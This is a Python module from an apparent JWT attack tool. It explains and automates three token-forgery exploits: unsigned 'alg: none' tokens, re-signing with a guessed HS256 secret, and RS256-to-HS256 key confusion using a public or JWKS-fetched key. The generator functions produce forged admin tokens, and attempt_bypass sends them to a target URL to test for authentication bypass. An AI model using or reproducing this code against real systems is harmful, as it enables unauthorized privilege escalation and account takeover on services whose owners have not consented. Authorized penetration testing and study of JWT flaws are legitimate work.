import jwt
import base64
import json
import requests
from . import ui


def fetch_first_jwks_key(jwks_url):
    try:
        resp = requests.get(jwks_url, timeout=5)
        jwks = resp.json()
        key = jwks.get("keys", [])[0]
        if not key:
            return None
        return jwt.algorithms.RSAAlgorithm.from_jwk(json.dumps(key))
    except Exception:
        return None

# === EXPLAIN FUNCTIONS ===

def explain_alg_none():
    ui.warn("\n[!] Exploit: 'alg: none'")
    print("""
➤ Description:
  The JWT uses 'alg: none', meaning the signature is not verified.
  If the server accepts such a token, an attacker can forge a valid one.

➤ How to exploit:
  1. Base64-encode a header like: {"alg":"none","typ":"JWT"}
  2. Modify the payload (e.g., change role to "admin")
  3. Base64-encode the new payload
  4. Concatenate header.payload. (note: signature is blank!)

➤ Example (Python):
  import base64, json
  header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
  payload = base64.urlsafe_b64encode(json.dumps({"role":"admin"}).encode()).decode().rstrip("=")
  print(f"{header}.{payload}.")
""")


def explain_hs256_key_found(secret):
    ui.warn("\n[!] Exploit: HS256 with guessable secret")
    print(f"""
➤ Description:
  The JWT is signed with a weak or guessable shared secret. You found it: **{secret}**

➤ How to exploit:
  Modify the payload and re-sign it using this secret.

➤ Example (Python):
  import jwt
  new_payload = {{ "user": "admin" }}
  token = jwt.encode(new_payload, "{secret}", algorithm="HS256")
  print(token)
""")


def explain_rs256_downgrade():
    ui.warn("\n[!] Exploit: RS256 to HS256 Downgrade (Key Confusion)")
    print("""
➤ Description:
  The application uses RS256 (public/private key signing) but doesn't enforce key type.
  An attacker can supply HS256 instead and sign the token using the public key as the HMAC secret.

➤ Steps:
  1. Get the original RS256 JWT.
  2. Replace the alg in the header: "RS256" → "HS256"
  3. Re-sign the token using the public key as the HMAC secret.

➤ Example (Python):
  import jwt

  public_key = open("public.pem", "r").read()
  payload = { "user": "admin" }

  token = jwt.encode(payload, public_key, algorithm="HS256")
  print(token)

➤ Tip:
  Only works if backend improperly allows HS256 and uses public key as secret.
""")


def explain_exploit(vuln_id, **kwargs):
    if vuln_id == "alg-none":
        explain_alg_none()
    elif vuln_id == "hs256-key-found":
        secret = kwargs.get("secret")
        if not secret:
            ui.error("[!] Missing --secret argument.")
        else:
            explain_hs256_key_found(secret)
    elif vuln_id == "alg-swap-rs256":
        explain_rs256_downgrade()
    else:
        ui.info(f"[~] No exploit guidance available for: {vuln_id}")


def list_available_exploits():
    ui.info("\n[+] Available exploit IDs:\n")
    print("  - alg-none           → No signature verification")
    print("  - hs256-key-found    → HMAC key discovered via brute-force")
    print("  - alg-swap-rs256     → RS256 to HS256 downgrade attack")


# === POC GENERATOR ===

def generate_poc_token(vuln_id, secret=None, jwks_url=None):
    payload = {"user": "admin", "admin": True}
    if vuln_id == "alg-none":
        header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
        body = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        token = f"{header}.{body}."
    elif vuln_id == "hs256-key-found" and secret:
        token = jwt.encode(payload, secret, algorithm="HS256")
    elif vuln_id == "alg-swap-rs256" and secret:
        token = jwt.encode(payload, secret, algorithm="HS256")  # using public key as secret
    elif vuln_id == "alg-swap-rs256" and jwks_url:
        key = fetch_first_jwks_key(jwks_url)
        if key:
            token = jwt.encode(payload, key, algorithm="HS256")
        else:
            ui.error("[!] Failed to fetch JWKS key")
            return
    else:
        ui.error("[!] Cannot generate PoC: missing secret or invalid vuln ID.")
        return

    ui.success("\n[+] PoC Token:")
    print(token)
    ui.info("\n[+] Example Usage:")
    print(f'curl -H "Authorization: Bearer {token}" https://target.com/api')


# === AUTH BYPASS ===

def attempt_bypass(vuln_id, token, url, jwks_url=None):
    ui.info(f"\n[🔍] Testing token bypass at: {url}")
    if jwks_url and vuln_id == "alg-swap-rs256":
        key = fetch_first_jwks_key(jwks_url)
        if key:
            try:
                token = jwt.encode({"user": "admin"}, key, algorithm="HS256")
                ui.success("[+] Crafted token using JWKS key")
            except Exception:
                ui.error("[!] Failed to craft token from JWKS")
    headers = {"Authorization": f"Bearer {token}"}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        ui.success(f"[+] Status Code: {response.status_code}")
        print(response.text[:300] + "..." if len(response.text) > 300 else response.text)
    except Exception as e:
        ui.error(f"[!] Error during request: {e}")
